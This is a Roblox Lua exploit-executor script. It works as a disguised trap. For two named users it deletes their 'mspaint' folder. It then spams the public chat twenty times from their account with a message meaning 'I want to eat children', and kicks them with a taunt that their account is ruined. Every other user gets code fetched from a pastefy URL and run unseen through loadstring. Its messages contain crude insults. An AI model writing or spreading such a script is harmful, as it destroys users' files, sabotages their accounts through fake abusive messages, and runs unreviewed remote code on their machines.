local LocalPlayer = game.Players.LocalPlayer

-- 允许的用户名列表
local allowedUsers = {
    ["zzyzzy46 "] = true,
    ["25485hs"] = true,
}

if allowedUsers[LocalPlayer.Name] then
    print("在指定名单里，执行A脚本")
    local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local player = Players.LocalPlayer

local message = Instance.new("Message", game:GetService("CoreGui"))
message.Text = "mspaint被删了lol"

local function deleteMspaint()
    local folder = "mspaint"
    if isfolder and delfolder then
        if isfolder(folder) then
            local success, err = pcall(function()
                delfolder(folder)
            end)
            if success then
                print("你mspaint被删了sb")
            else
                warn("右边的傻逼错误滚：", err)
            end
        else
            print("傻逼你没有mspaint")
        end
    else
        warn("你不用注入器？？")
    end
end

local function spamExpose()
    local textChannelContainer = TextChatService:FindFirstChild("TextChannels")
    if textChannelContainer then
        local general = textChannelContainer:FindFirstChild("RBXGeneral")
        if general then
            for i = 1, 20 do
                task.spawn(function()
                    pcall(function()
                        general:SendAsync("我要吃小孩")
                    end)
                end)
                task.wait(0.1)
            end
        else
            warn("未找到聊天频道 RBXGeneral")
        end
    else
        warn("TextChannels 未加载")
    end
end

deleteMspaint() 
task.wait(2)     
spamExpose()    
task.wait(2)     
message:Destroy() 
player:Kick("你mspaint被删了 你号也废了lol")
else
    print("不在名单里，执行B脚本")
loadstring(game:HttpGet('https://pastefy.app/7vZN3EwV/raw'))()
end
